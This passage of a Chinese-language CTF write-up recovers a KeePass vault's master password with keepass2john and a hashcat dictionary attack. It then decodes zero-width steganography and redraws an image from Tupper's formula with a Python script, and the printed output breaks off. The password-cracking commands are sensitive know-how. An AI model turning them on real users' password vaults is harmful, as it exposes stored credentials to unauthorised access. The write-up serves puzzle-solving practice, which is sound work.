formula\uff09\u9690\u5199","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u5148\u628a\u540e\u7f00\u540d <code>.zip</code> \u8865\u4e0a\uff0c\u518d\u89e3\u538b\u7f29</p> <p></p> <p><code>.kdbx</code> \u6587\u4ef6\u9700\u8981 keepass \u6253\u5f00\uff0c\u6253\u5f00\u53d1\u73b0\u9700\u8981\u5bc6\u7801</p> <p></p> <p><code>keepass2john</code> \u662f John The Ripper\uff08\u7b80\u79f0 JtR\uff09\u81ea\u5e26\u7684\u8f85\u52a9\u5de5\u5177</p> <p>\u7528\u4e8e\u628a KeePass \u5bc6\u7801\u5e93\uff08<code>.kdbx</code> \u6587\u4ef6\uff09\u8f6c\u6362\u4e3a John the Ripper \u53ef\u8bc6\u522b\u7684\u54c8\u5e0c\u683c\u5f0f</p> <p>\u4ece\u800c\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\uff08\u5982\u5b57\u5178\u653b\u51fb\u3001\u89c4\u5219\u653b\u51fb\u7b49\uff09\u53bb\u7834\u89e3\u4e3b\u5bc6\u7801</p> <pre><code>keepass2john '/home/kali/len5.kdbx'\n</code></pre> <p></p> <p>\u5220\u6389\u5f00\u5934\u7684 <code>len5:</code></p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 HashCat \u7206\u7834</p> <pre><code>hashcat -m 13400 keepass.hash  -a 0 password.txt  --force\n# m\uff1a\u7834\u89e3\u7684 hash\u7c7b\u578b\uff0chashcat -h \u4f55\u67e5\u770b\u7c7b\u578b\n# a\uff1a\u7206\u7834\u7684\u65b9\u6cd5\uff0c0 \u8868\u793a\u5b57\u5178\u7206\u7834\n# force\uff1a\u4e0d\u62a5\u9519\n</code></pre> <p>\u5f97\u5230\u5bc6\u7801 13152\uff0c\u6253\u5f00\u6587\u4ef6\u5f97\u5230\u538b\u7f29\u5305\u7684\u5bc6\u7801</p> <p></p> <p>\u89e3\u538b\u5f97\u5230\u4e24\u4e2a\u6587\u4ef6</p> <p></p> <p><code>hint.txt</code> \u662f\u96f6\u5bbd\u9690\u5199\uff0c\u5f97\u5230 <code>22*160</code></p> <p></p> <p>\u8fd9\u91cc\u6d89\u53ca\u5230 <code>\u5854\u73c0\u81ea\u6307\u516c\u5f0f(Tupper's self-referential formula)</code> \u77e5\u8bc6\u70b9\uff0c\u4f46\u9ed8\u8ba4\u7684 online decode \u6807\u51c6\u662f <code>17*106</code> \u7684</p> <p></p> <p>\u53c2\u8003\u63d0\u793a\u5199\u811a\u672c\u91cd\u65b0\u7ed8\u56fe</p> <pre><code>from functools import reduce\n\n\ndef Tuppers_Self_Referential_Formula():\n    k = 92898203278702907929705938676672021500394791427205757369123489204565300324859717082409892641951206664564991991489354661871425872649524078000948199832659815275909285198829276929014694628110159824930931595166203271443269827449505707655085842563682060910813942504507936625555735585913273575050118552353192682955310220323463465408645422334101446471078933149287336241772448338428740302833855616421538520769267636119285948674549756604384946996184385407505456168240123319785800909933214695711828013483981731933773017336944656397583872267126767778549745087854794302808950100966582558761224454242018467578959766617176016660101690140279961968740323327369347164623746391335756442566959352876706364265509834319910419399748338894746638758652286771979896573695823608678008814861640308571256880794312652055957150464513950305355055495262375870102898500643010471425931450046440860841589302890250456138060738689526283389256801969190204127358098408264204643882520969704221896973544620102494391269663693407573658064279947688509910028257209987991480259150865283245150325813888942058\n\n    def f(x, y):\n        d = ((-22 * x) - (y % 22))\n        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1\n        g = ((y // 22) // e) % 2\n        return 0.5 &lt; g\n\n    for y in range(k + 21, k - 1, -1):\n        line = \"\"\n        for x in range(0, 160):\n            if f(x, y):\n                line += \" \u25a0\"\n            else:\n                line += \"  \"\n        print(line)\n\n\nif __name__ == '__main__':\n    Tuppers_Self_Referential_Formula()\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\u5f97\u5230\u4e09\u4e2a\u6570 <code>33</code>\u3001<code>121</code>\u3001<code>144</code></p> <pre><code> \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 